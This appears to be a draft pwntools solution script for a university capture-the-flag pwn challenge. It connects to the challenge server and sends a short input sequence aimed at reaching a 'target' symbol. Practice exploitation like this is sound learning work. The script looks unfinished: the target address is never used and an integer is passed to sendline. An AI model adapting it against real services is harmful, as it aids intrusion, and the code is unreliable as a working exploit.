from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10004
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+201
        b *main+237
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

target_address = p64(e.symbols["target"])
dummy = b'A' * 10
payload = 8  # mulai dari 0x40 waktu n = 1, cari perkalian 8 sampe 0x10
p.sendline(payload)
for i in range(8):
    p.sendline('-')
payload = dummy
p.sendline(payload)
print(p.recvall().decode())
if LOCAL:
    pause()
